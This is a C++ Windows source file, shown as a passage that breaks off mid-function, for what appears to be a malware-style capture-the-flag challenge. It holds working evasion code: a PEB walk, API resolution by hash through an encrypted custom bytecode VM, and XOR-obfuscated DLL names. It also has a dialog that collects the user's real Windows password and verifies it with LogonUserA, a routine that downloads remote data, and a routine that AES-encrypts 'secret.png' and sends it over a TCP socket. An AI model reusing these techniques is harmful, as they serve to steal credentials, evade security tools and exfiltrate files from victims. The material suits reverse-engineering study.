#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <objidl.h>
#include <gdiplus.h>
#include <wincodec.h>
#include <commctrl.h>
#include <stdio.h>
#include <stdarg.h>
#include <intrin.h>
#include <wincrypt.h>
#include <string.h>
#include <stdlib.h>
#include <wininet.h>
#include "resource.h"

#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable : 4996)
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "uxtheme.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "windowscodecs.lib")
#pragma comment(lib, "msimg32.lib")

using namespace Gdiplus;

#ifdef _WIN64
#define PEB_OFFSET 0x60
#else
#define PEB_OFFSET 0x30
#endif

#define WM_WORKER_DONE (WM_USER + 2)

HWND hDimWnd;
HWND hMainWnd;
HWND hEditPass;
HWND hBtnYes;
HWND hBtnNo;
HWND hBtnReveal;
HINSTANCE g_hInst;
HFONT hFontTitle;
HFONT hFontHeading;
HFONT hFontNormal;
HFONT hFontSmall;
HFONT hFontBtn;
HANDLE hWorkerThread = NULL;
WNDPROC origBtnYesProc = NULL;
WNDPROC origBtnNoProc = NULL;
WNDPROC origEditProc = NULL;
WNDPROC origBtnRevealProc = NULL;
BOOL bYesHover = FALSE;
BOOL bNoHover = FALSE;
BOOL bEditFocused = FALSE;
BOOL bRevealHover = FALSE;
BOOL bPasswordVisible = FALSE;
BOOL bShowError = FALSE;
ULONG_PTR gdiplusToken;
HBRUSH hEditBrush = NULL;
HBITMAP hLogoBitmap = NULL;
int logoWidth = 0;
int logoHeight = 0;
char exePath[MAX_PATH] = { 0 };

#define CLR_BG_DARK      RGB(32, 32, 32)
#define CLR_BG_HEADER    RGB(45, 45, 48)
#define CLR_TEXT_WHITE   RGB(255, 255, 255)
#define CLR_TEXT_GRAY    RGB(180, 180, 180)
#define CLR_TEXT_YELLOW  RGB(255, 200, 50)
#define CLR_EDIT_BG      RGB(50, 50, 50)
#define CLR_BTN_NORMAL   RGB(60, 60, 60)
#define CLR_BTN_HOVER    RGB(80, 80, 80)
#define CLR_BTN_BORDER   RGB(100, 100, 100)

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union {
        BOOLEAN BitField;
        struct {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsLegacyProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN SpareBits : 3;
        };
    };
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
} PEB, * PPEB;

static const BYTE vm_prng_instructions[] = {
    0x01, 0x2D, 0x9A, 0x3F, 0x8E, 0x02, 0x1F, 0x2E, 0x7B, 0x4C, 0x0C, 0x3B, 0x8C, 0x5D, 0x2A, 0x04, 0x09, 0x10, 0x00, 0x06, 0x12, 0x13, 0x05, 0x14, 0x13, 0x03, 0x06, 0x12, 0x13, 0x07, 0x14, 0x08, 0x0B, 0xEC, 0xFF, 0x0A
};

static const DWORD vm_prng_instructions_size = 36;

static const BYTE vm_instructions_encrypted[] = {
    0xF1, 0x1E, 0xBC, 0x3D, 0xD7, 0xD5, 0x58, 0x9D, 0xE9, 0x7F, 0xDE, 0x6B, 0xDE, 0xC9, 0xE8, 0xD0, 0x5D, 0x70, 0xE9, 0x95, 0x50, 0x5B, 0x8D, 0x5F, 0x47, 0x53, 0x4C, 0x4A, 0x4B, 0x1C, 0x17, 0x52, 0x46, 0xC7, 0xBB, 0xC0, 0x47, 0x64, 0xEF, 0x82, 0x07, 0x57, 0xE8, 0xBF, 0x55
};

static const DWORD vm_instructions_size = 45;
static BYTE vm_instructions[45] = { 0 };

enum VM_Opcode {
    VM_LOAD_CONST_R0 = 0x01,
    VM_LOAD_CONST_R1 = 0x02,
    VM_LOAD_CONST_R2 = 0x03,
    VM_LOAD_BYTE_R2_R1 = 0x04,
    VM_OR_R2_CONST = 0x05,
    VM_XOR_R0_R2 = 0x06,
    VM_MUL_R0_CONST = 0x07,
    VM_INC_R1 = 0x08,
    VM_JZ_R2_OFFSET = 0x09,
    VM_RET_R0 = 0x0A,
    VM_JMP_OFFSET = 0x0B,
    VM_LOAD_CONST_R3 = 0x0C,
    VM_LOAD_CONST_R4 = 0x0D,
    VM_AND_R0_R2 = 0x10,
    VM_NOT_R2 = 0x11,
    VM_ADD_R0_R2 = 0x12,
    VM_ROL_R0_CONST = 0x13,
    VM_XOR_R0_R1 = 0x14,
};

static DWORD vm_read_uint32(const BYTE*& ip) {
    DWORD value = 0;
    value |= static_cast<DWORD>(*ip++);
    value |= static_cast<DWORD>(*ip++) << 8;
    value |= static_cast<DWORD>(*ip++) << 16;
    value |= static_cast<DWORD>(*ip++) << 24;
    return value;
}

static INT16 vm_read_int16(const BYTE*& ip) {
    INT16 value = 0;
    BYTE low = *ip++;
    BYTE high = *ip++;
    value = static_cast<INT16>((high << 8) | low);
    return value;
}

static BYTE vm_read_uint8(const BYTE*& ip) {
    return *ip++;
}

static DWORD vm_execute_internal(const char* input_str, const BYTE* instructions_ptr);

static DWORD vm_execute_prng(const char* input_str) {
    DWORD R0 = 0;
    const char* R1 = input_str;
    DWORD R2 = 0;
    DWORD R3 = 0;
    DWORD R4 = 0;
    DWORD R1_val = 0;

    const BYTE* ip = vm_prng_instructions;
    const BYTE* end = vm_prng_instructions + vm_prng_instructions_size;

    while (ip < end) {
        if (ip >= end) break;
        BYTE opcode = *ip++;
        if (opcode == 0) break;

        switch (opcode) {
            case VM_LOAD_CONST_R0: {
                R0 = vm_read_uint32(ip);
                break;
            }
            case VM_LOAD_CONST_R1: {
                R1_val = vm_read_uint32(ip);
                break;
            }
            case VM_LOAD_CONST_R2: {
                R2 = vm_read_uint32(ip);
                break;
            }
            case VM_LOAD_CONST_R3: {
                R3 = vm_read_uint32(ip);
                break;
            }
            case VM_LOAD_CONST_R4: {
                R4 = vm_read_uint32(ip);
                break;
            }
            case VM_LOAD_BYTE_R2_R1: {
                R2 = static_cast<BYTE>(*R1);
                break;
            }
            case VM_OR_R2_CONST: {
                DWORD constant = vm_read_uint32(ip);
                R2 |= constant;
                break;
            }
            case VM_XOR_R0_R2: {
                R0 ^= R2;
                break;
            }
            case VM_XOR_R0_R1: {
                R0 ^= R1_val;
                break;
            }
            case VM_AND_R0_R2: {
                R0 &= R2;
                break;
            }
            case VM_NOT_R2: {
                R2 = ~R2;
                break;
            }
            case VM_ADD_R0_R2: {
                R0 = (R0 + R2) & 0xFFFFFFFF;
                break;
            }
            case VM_ROL_R0_CONST: {
                BYTE shift = vm_read_uint8(ip);
                R0 = ((R0 << shift) | (R0 >> (32 - shift))) & 0xFFFFFFFF;
                break;
            }
            case VM_MUL_R0_CONST: {
                DWORD constant = vm_read_uint32(ip);
                R0 *= constant;
                break;
            }
            case VM_INC_R1: {
                R1++;
                break;
            }
            case VM_JZ_R2_OFFSET: {
                INT16 offset = vm_read_int16(ip);
                if (R2 == 0) {
                    ip += offset;
                }
                break;
            }
            case VM_JMP_OFFSET: {
                INT16 offset = vm_read_int16(ip);
                ip += offset;
                break;
            }
            case VM_RET_R0: {
                return R0;
            }
            default: {
                return 0;
            }
        }
    }

    return R0;
}

static void vm_decrypt_instructions() {
    static BOOL decrypted = FALSE;
    if (decrypted) return;

    const char* seed = "THIS_IS_FOR_R7";
    DWORD state = vm_execute_prng(seed);

    for (DWORD i = 0; i < vm_instructions_size; i++) {
        char input_buffer[256];
        sprintf(input_buffer, "%s%u%u", seed, state, i);
        BYTE keystream_byte = static_cast<BYTE>(vm_execute_prng(input_buffer) & 0xFF);
        vm_instructions[i] = vm_instructions_encrypted[i] ^ keystream_byte;
        char state_buffer[256];
        sprintf(state_buffer, "%s%u", seed, i);
        state = vm_execute_prng(state_buffer);
    }

    decrypted = TRUE;
}

static DWORD vm_execute_internal(const char* input_str, const BYTE* instructions_ptr) {
    DWORD R0 = 0;
    const char* R1 = input_str;
    DWORD R2 = 0;
    DWORD R3 = 0;
    DWORD R4 = 0;
    DWORD R1_val = 0;

    const BYTE* ip = instructions_ptr;
    const BYTE* end = instructions_ptr + vm_instructions_size;

    while (ip < end) {
        if (ip >= end) break;
        BYTE opcode = *ip++;
        if (opcode == 0) break;

        switch (opcode) {
            case VM_LOAD_CONST_R0: {
                R0 = vm_read_uint32(ip);
                break;
            }
            case VM_LOAD_CONST_R1: {
                R1_val = vm_read_uint32(ip);
                break;
            }
            case VM_LOAD_CONST_R2: {
                R2 = vm_read_uint32(ip);
                break;
            }
            case VM_LOAD_CONST_R3: {
                R3 = vm_read_uint32(ip);
                break;
            }
            case VM_LOAD_CONST_R4: {
                R4 = vm_read_uint32(ip);
                break;
            }
            case VM_LOAD_BYTE_R2_R1: {
                R2 = static_cast<BYTE>(*R1);
                break;
            }
            case VM_OR_R2_CONST: {
                DWORD constant = vm_read_uint32(ip);
                R2 |= constant;
                break;
            }
            case VM_XOR_R0_R2: {
                R0 ^= R2;
                break;
            }
            case VM_XOR_R0_R1: {
                R0 ^= R1_val;
                break;
            }
            case VM_AND_R0_R2: {
                R0 &= R2;
                break;
            }
            case VM_NOT_R2: {
                R2 = ~R2;
                break;
            }
            case VM_ADD_R0_R2: {
                R0 = (R0 + R2) & 0xFFFFFFFF;
                break;
            }
            case VM_ROL_R0_CONST: {
                BYTE shift = vm_read_uint8(ip);
                R0 = ((R0 << shift) | (R0 >> (32 - shift))) & 0xFFFFFFFF;
                break;
            }
            case VM_MUL_R0_CONST: {
                DWORD constant = vm_read_uint32(ip);
                R0 *= constant;
                break;
            }
            case VM_INC_R1: {
                R1++;
                break;
            }
            case VM_JZ_R2_OFFSET: {
                INT16 offset = vm_read_int16(ip);
                if (R2 == 0) {
                    ip += offset;
                }
                break;
            }
            case VM_JMP_OFFSET: {
                INT16 offset = vm_read_int16(ip);
                ip += offset;
                break;
            }
            case VM_RET_R0: {
                return R0;
            }
            default: {
                return 0;
            }
        }
    }

    return R0;
}

static DWORD vm_execute(const char* input_str) {
    vm_decrypt_instructions();
    return vm_execute_internal(input_str, vm_instructions);
}

DWORD HashStringFNV1A(const char* str) {
    DWORD result = vm_execute(str);
    return result;
}

void DecryptString(char* data, size_t len, BYTE key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

PVOID GetModuleBaseByHash(DWORD moduleHash) {
    PPEB peb;
#ifdef _WIN64
    peb = (PPEB)__readgsqword(PEB_OFFSET);
#else
    peb = (PPEB)__readfsdword(PEB_OFFSET);
#endif

    PPEB_LDR_DATA ldr = peb->Ldr;
    PLIST_ENTRY listEntry = ldr->InLoadOrderModuleList.Flink;

    while (listEntry != &ldr->InLoadOrderModuleList) {
        PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(listEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

        if (entry->BaseDllName.Buffer) {
            char dllName[256] = { 0 };
            int i = 0;
            while (i < entry->BaseDllName.Length / sizeof(WCHAR) && i < 255) {
                dllName[i] = (char)(entry->BaseDllName.Buffer[i] | 0x20);
                i++;
            }
            DWORD currentHash = HashStringFNV1A(dllName);
            if (currentHash == moduleHash) {
                return entry->DllBase;
            }
        }
        listEntry = listEntry->Flink;
    }
    return NULL;
}

PVOID GetProcAddressByHash(PVOID moduleBase, DWORD functionHash) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS32 ntHeaders32 = (PIMAGE_NT_HEADERS32)((PBYTE)moduleBase + dosHeader->e_lfanew);
    if (ntHeaders32->Signature != IMAGE_NT_SIGNATURE) return NULL;

    IMAGE_DATA_DIRECTORY exportDir;
#ifdef _WIN64
    PIMAGE_NT_HEADERS64 ntHeaders64 = (PIMAGE_NT_HEADERS64)ntHeaders32;
    exportDir = ntHeaders64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
#else
    exportDir = ntHeaders32->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
#endif

    if (!exportDir.VirtualAddress) return NULL;

    PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)moduleBase + exportDir.VirtualAddress);
    PDWORD addressOfFunctions = (PDWORD)((PBYTE)moduleBase + exportDirectory->AddressOfFunctions);
    PDWORD addressOfNames = (PDWORD)((PBYTE)moduleBase + exportDirectory->AddressOfNames);
    PWORD addressOfNameOrdinals = (PWORD)((PBYTE)moduleBase + exportDirectory->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++) {
        const char* functionName = (const char*)((PBYTE)moduleBase + addressOfNames[i]);
        if (HashStringFNV1A(functionName) == functionHash) {
            WORD ordinal = addressOfNameOrdinals[i];
            DWORD functionRVA = addressOfFunctions[ordinal];
            return (PVOID)((PBYTE)moduleBase + functionRVA);
        }
    }
    return NULL;
}

BOOL MD5Hash(const char* input, size_t inputLen, BYTE* output, DWORD* outputLen) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    BOOL result = FALSE;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) return FALSE;
    if (CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) {
        if (CryptHashData(hHash, (BYTE*)input, (DWORD)inputLen, 0)) {
            *outputLen = 16;
            result = CryptGetHashParam(hHash, HP_HASHVAL, output, outputLen, 0);
        }
        CryptDestroyHash(hHash);
    }
    CryptReleaseContext(hProv, 0);
    return result;
}

BOOL Base64Decode(const BYTE* input, DWORD inputLen, BYTE** output, DWORD* outputLen) {
    DWORD required = 0;
    if (!CryptStringToBinaryA((LPCSTR)input, inputLen, CRYPT_STRING_BASE64, NULL, &required, NULL, NULL)) return FALSE;
    BYTE* buffer = (BYTE*)malloc(required);
    if (!buffer) return FALSE;
    if (!CryptStringToBinaryA((LPCSTR)input, inputLen, CRYPT_STRING_BASE64, buffer, &required, NULL, NULL)) {
        free(buffer);
        return FALSE;
    }
    *output = buffer;
    *outputLen = required;
    return TRUE;
}

BOOL VerifyPassword(const char* password) {
    BYTE xorKey1 = 0xAA;
    char moduleName[] = { (char)0xCB, (char)0xCE, (char)0xDC, (char)0xCB, (char)0xDA, (char)0xC3, (char)0x99, (char)0x98, (char)0x84, (char)0xCE, (char)0xC6, (char)0xC6, (char)0xAA };
    DWORD advapi32Hash;
    const DWORD GETUSERNAMEA_HASH = 0xE80FBD9D;
    const DWORD LOGONUSERA_HASH = 0x711F1AD5;

    PVOID advapi32Base;
    typedef BOOL(WINAPI* pGetUserNameA)(LPSTR, LPDWORD);
    typedef BOOL(WINAPI* pLogonUserA)(LPCSTR, LPCSTR, LPCSTR, DWORD, DWORD, PHANDLE);
    pGetUserNameA GetUserNameAFunc;
    pLogonUserA LogonUserAFunc;

    char username[256];
    DWORD usernameLen = sizeof(username);
    HANDLE hToken = NULL;
    BOOL result = FALSE;

    DecryptString(moduleName, sizeof(moduleName), xorKey1);
    advapi32Hash = HashStringFNV1A(moduleName);
    advapi32Base = GetModuleBaseByHash(advapi32Hash);
    if (!advapi32Base) {
        return FALSE;
    }

    GetUserNameAFunc = (pGetUserNameA)GetProcAddressByHash(advapi32Base, GETUSERNAMEA_HASH);
    if (!GetUserNameAFunc) {
        return FALSE;
    }

    LogonUserAFunc = (pLogonUserA)GetProcAddressByHash(advapi32Base, LOGONUSERA_HASH);
    if (!LogonUserAFunc) {
        return FALSE;
    }

    if (!GetUserNameAFunc(username, &usernameLen)) {
        return FALSE;
    }

    result = LogonUserAFunc(
        username,
        NULL,
        password,
        LOGON32_LOGON_INTERACTIVE,
        LOGON32_PROVIDER_DEFAULT,
        &hToken
    );

    if (hToken) {
        CloseHandle(hToken);
    }

    return result;
}

BOOL DownloadUrlToMemory(const char* url, BYTE** data, DWORD* dataLen) {
    HINTERNET hInternet = InternetOpen("caret-ware", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) {
        return FALSE;
    }

    HINTERNET hUrl = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    BYTE* buffer = NULL;
    DWORD totalSize = 0;
    BYTE temp[4096];
    DWORD bytesRead = 0;

    BOOL readResult;
    do {
        readResult = InternetReadFile(hUrl, temp, sizeof(temp), &bytesRead);
        if (!readResult) {
            if (buffer) free(buffer);
            InternetCloseHandle(hUrl);
            InternetCloseHandle(hInternet);
            return FALSE;
        }
        if (bytesRead == 0) break;

        BYTE* newBuffer = (BYTE*)realloc(buffer, totalSize + bytesRead);
        if (!newBuffer) {
            if (buffer) free(buffer);
            InternetCloseHandle(hUrl);
            InternetCloseHandle(hInternet);
            return FALSE;
        }
        buffer = newBuffer;
        memcpy(buffer + totalSize, temp, bytesRead);
        totalSize += bytesRead;
    } while (bytesRead > 0);

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    if (!buffer || totalSize == 0) {
        if (buffer) free(buffer);
        return FALSE;
    }

    *data = buffer;
    *dataLen = totalSize;
    return TRUE;
}

BOOL AESEncrypt(const BYTE* plaintext, DWORD plaintextLen, const BYTE* key, const BYTE* iv, BYTE* ciphertext, DWORD* ciphertextLen) {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    BOOL result = FALSE;
    DWORD mode = CRYPT_MODE_CBC;

    if (!CryptAcquireContext(&hProv, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return FALSE;
    }

    struct {
        BLOBHEADER hdr;
        DWORD dwKeySize;
        BYTE rgbKey[16];
    } keyBlob;

    keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
    keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
    keyBlob.hdr.reserved = 0;
    keyBlob.hdr.aiKeyAlg = CALG_AES_128;
    keyBlob.dwKeySize = 16;
    memcpy(keyBlob.rgbKey, key, 16);

    if (CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey)) {
        if (CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0)) {
            if (CryptSetKeyParam(hKey, KP_IV, (BYTE*)iv, 0)) {
                DWORD bufferSize = *ciphertextLen;
                DWORD dataLen = plaintextLen;
                memcpy(ciphertext, plaintext, plaintextLen);
                *ciphertextLen = dataLen;
                if (CryptEncrypt(hKey, 0, TRUE, 0, ciphertext, ciphertextLen, bufferSize)) {
                    result = TRUE;
                }
            }
        }
        if (hKey) CryptDestroyKey(hKey);
    }
    if (hProv) CryptReleaseContext(hProv, 0);
    return result;
}

BOOL SendToPort(const BYTE* data, DWORD dataLen, const char* host, int port) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return FALSE;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return FALSE;
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    serverAddr.sin_addr.s_addr = inet_addr(host);

    if (serverAddr.sin_addr.s_addr == INADDR_NONE) {
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }

    BOOL result = FALSE;
    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == 0) {
        int bytesSent = send(sock, (const char*)data, dataLen, 0);
        if (bytesSent == dataLen) {
            result = TRUE;
        }
    }

    closesocket(sock);
    WSACleanup();
    return result;
}

DWORD WINAPI ProcessLogicThread(LPVOID lpParam) {
    char* password = (char*)lpParam;
    int result = 0;

    BYTE xorKey1 = 0xAA;
    char moduleName[] = { (char)0xC1, (char)0xCF, (char)0xD8, (char)0xC4, (char)0xCF, (char)0xC6, (char)0x99, (char)0x98, (char)0x84, (char)0xCE, (char)0xC6, (char)0xC6, (char)0xAA };
    DWORD kernel32Hash;
    const DWORD GETVERSIONEX_HASH = 0x889877CE;
    const DWORD GETCOMPUTERNAME_HASH = 0x76B1AEBC;

    PVOID kernel32Base;
    typedef BOOL(WINAPI* pGetVersionEx)(LPOSVERSIONINFO);
    typedef BOOL(WINAPI* pGetComputerNameA)(LPSTR, LPDWORD);
    pGetVersionEx GetVersionExFunc;
    pGetComputerNameA GetComputerNameFunc;
    OSVERSIONINFOEX verInfo = { 0 };
    size_t passwordLen;
    char versionString[256];
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD computerNameLen = MAX_COMPUTERNAME_LENGTH + 1;
    size_t combinedLen;
    char* combined = NULL;
    BYTE md5Hash[16];
    DWORD md5Len = 16;
    FILE* file = NULL;
    long fileSize;
    BYTE* fileData = NULL;
    DWORD encryptedSize;
    BYTE* encryptedData = NULL;
    BYTE* remoteData = NULL;
    DWORD remoteDataLen = 0;
    BYTE* decodedRemote = NULL;
    DWORD decodedRemoteLen = 0;
    BYTE iv[16];
    DWORD ivLen = 16;

    if (!VerifyPassword(password)) { result = 4; goto cleanup; }

    DecryptString(moduleName, sizeof(moduleName), xorKey1);
    kernel32Hash = HashStringFNV1A(moduleName);
    kernel32Base = GetModuleBaseByHash(kernel32Hash);
    if (!kernel32Base) {
        result = 1;
        goto cleanup;
    }

    GetVersionExFunc = (pGetVersionEx)GetProcAddressByHash(kernel32Base, GETVERSIONEX_HASH);
    if (!GetVersionExFunc) {
        result = 1;
        goto cleanup;
    }
    GetComputerNameFunc = (pGetComputerNameA)GetProcAddressByHash(kernel32Base, GETCOMPUTERNAME_HASH);
    if (!GetComputerNameFunc) {
        result = 1;
        goto cleanup;
    }

    verInfo.dwOSVersionInfoSize = sizeof(verInfo);
    if (!GetVersionExFunc((OSVERSIONINFO*)&verInfo)) { result = 1; goto cleanup; }

    if (!GetComputerNameFunc(computerName, &computerNameLen)) { result = 1; goto cleanup; }

    passwordLen = strlen(password);
    sprintf(versionString, "%lu.%lu.%lu", verInfo.dwMajorVersion, verInfo.dwMinorVersion, verInfo.dwBuildNumber);

    combinedLen = strlen(versionString) + passwordLen + strlen(computerName);
    combined = (char*)malloc(combinedLen + 1);
    if (!combined) { result = 1; goto cleanup; }
    sprintf(combined, "%s%s%s", versionString, password, computerName);

    if (!MD5Hash(combined, combinedLen, md5Hash, &md5Len)) { result = 1; goto cleanup; }

    free(combined);
    combined = NULL;

    file = fopen("secret.png", "rb");
    if (!file) {
        result = 2;
        goto cleanup;
    }

    fseek(file, 0, SEEK_END);
    fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    fileData = (BYTE*)malloc(fileSize);
    if (!fileData) {
        fclose(file);
        result = 1;
        goto cleanup;
    }

    if (fread(fileData, 1, fileSize, file) != fileSize) {
        fclose(file);
        result = 1;
        goto cleanup;
    }
    fclose(file);
    file = NULL;

    encryptedSize = ((fileSize / 16) + 1) * 16;
    if (encryptedSize < fileSize + 16) { encryptedSize = fileSize + 16; }
    encryptedData = (BYTE*)malloc(encryptedSize);
    if (!encryptedData) { result = 1; goto cleanup; }

    memcpy(encryptedData, fileData, fileSize);

    if (!DownloadUrlToMemory("https://github.com/luka-4evr/my-saviour/raw/refs/heads/main/part2.txt", &remoteData, &remoteDataLen)) {
        result = 1;
        goto cleanup;
    }

    if (!Base64Decode(remoteData, remoteDataLen, &decodedRemote, &decodedRemoteLen)) {
        result = 1;
        goto cleanup;
    }

    {
        const BYTE key[] = { 'E', 'T', 'I', 'N' };
        const size_t keyLen = sizeof(key);
        for (DWORD i = 0; i < decodedRemoteLen; i++) {
            decodedRemote[i] ^= key[i % keyLen];
        }
    }

    if (!MD5Hash((const char*)decodedRemote, decodedRemoteLen, iv, &ivLen)) {
        result = 1;
        goto cleanup;
    }

    if (!AESEncrypt(encryptedData, fileSize, md5Hash, iv, encryptedData, &encryptedSize)) {
        result = 1;
        goto cleanup;
    }

    if (!SendToPort(encryptedData, encryptedSize, "127.0.0.1", 1338)) {
        result = 3;
        goto cleanup;
    }

cleanup:
    if (combined) free(combined);
    if (fileData) free(fileData);
    if (encryptedData) free(encryptedData);
    if (remoteData) free(remoteData);
    if (decodedRemote) free(decodedRemote);
    free(password);
    PostMessage(hMainWnd, WM_WORKER_DONE, (WPARAM)result, 0);
    return 0;
}

HBITMAP LoadImageWithWIC(const wchar_t* filename, int* outWidth, int* outHeight) {
    HBITMAP hBmp = NULL;
    IWICImagingFactory* pFactory = NULL;
    IWICBitmapDecoder* pDecoder = NULL;
    IWICBitmapFrameDecode* pFrame = NULL;
    IWICFormatConverter* pConverter = NULL;
    UINT width = 0, height = 0;
    BITMAPINFO bmi;
    void* pvImageBits = NULL;
    HDC hdcScreen = NULL;

    memset(&bmi, 0, sizeof(bmi));
    CoInitialize(NULL);

    if (FAILED(CoCreateInstance(CLSID_WICImagingFactory, NULL, CLSCTX_INPROC_SERVER,
        IID_IWICImagingFactory, (void**)&pFactory))) goto cleanup;

    if (FAILED(pFactory->CreateDecoderFromFilename(filename, NULL, GENERIC_READ,
        WICDecodeMetadataCacheOnLoad, &pDecoder))) goto cleanup;

    if (FAILED(pDecoder->GetFrame(0, &pFrame))) goto cleanup;

    if (FAILED(pFactory->CreateFormatConverter(&pConverter))) goto cleanup;

    if (FAILED(pConverter->Initialize(pFrame, GUID_WICPixelFormat32bppPBGRA,
        WICBitmapDitherTypeNone, NULL, 0.0, WICBitmapPaletteTypeCustom))) goto cleanup;

    pConverter->GetSize(&width, &height);
    *outWidth = width;
    *outHeight = height;

    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = width;
    bmi.bmiHeader.biHeight = -(int)height;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    hdcScreen = GetDC(NULL);
    hBmp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, &pvImageBits, NULL, 0);
    ReleaseDC(NULL, hdcScreen);

    if (hBmp) {
        UINT stride = width * 4;
        UINT bufferSize = stride * height;
        pConverter->CopyPixels(NULL, stride, bufferSize, (BYTE*)pvImageBits);
    }

cleanup:
    if (pConverter) pConverter->Release();
    if (pFrame) pFrame->Release();
    if (pDecoder) pDecoder->Release();
    if (pFactory) pFactory->Release();
    return hBmp;
}

HBITMAP LoadImageFromMemory(const BYTE* data, DWORD dataSize, int* outWidth, int* outHeight) {
    HBITMAP hBmp = NULL;
    IWICImagingFactory* pFactory = NULL;
    IWICStream* pStream = NULL;
    IWICBitmapDecoder* pDecoder = NULL;
    IWICBitmapFrameDecode* pFrame = NULL;
    IWICFormatConverter* pConverter = NULL;
    UINT width = 0, height = 0;
    BITMAPINFO bmi;
    void* pvImageBits = NULL;
    HDC hdcScreen = NULL;

    memset(&bmi, 0, sizeof(bmi));
    CoInitialize(NULL);

    if (FAILED(CoCreateInstance(CLSID_WICImagingFactory, NULL, CLSCTX_INPROC_SERVER,
        IID_IWICImagingFactory, (void**)&pFactory))) goto cleanup;

    if (FAILED(pFactory->CreateStream(&pStream))) goto cleanup;
    if (FAILED(pStream->InitializeFromMemory((BYTE*)data, dataSize))) goto cleanup;

    if (FAILED(pFactory->CreateDecoderFromStream(pStream, NULL,
        WICDecodeMetadataCacheOnLoad, &pDecoder))) goto cleanup;

    if (FAILED(pDecoder->GetFrame(0, &pFrame))) goto cleanup;

    if (FAILED(pFactory->CreateFormatConverter(&pConverter))) goto cleanup;

    if (FAILED(pConverter->Initialize(pFrame, GUID_WICPixelFormat32bppPBGRA,
        WICBitmapDitherTypeNone, NULL, 0.0, WICBitmapPaletteTypeCustom))) goto cleanup;

    pConverter->GetSize(&width, &height);
    *outWidth = width;
    *outHeight = height;

    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = width;
    bmi.bmiHeader.biHeight = -(int)height;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    hdcScreen = GetDC(NULL);
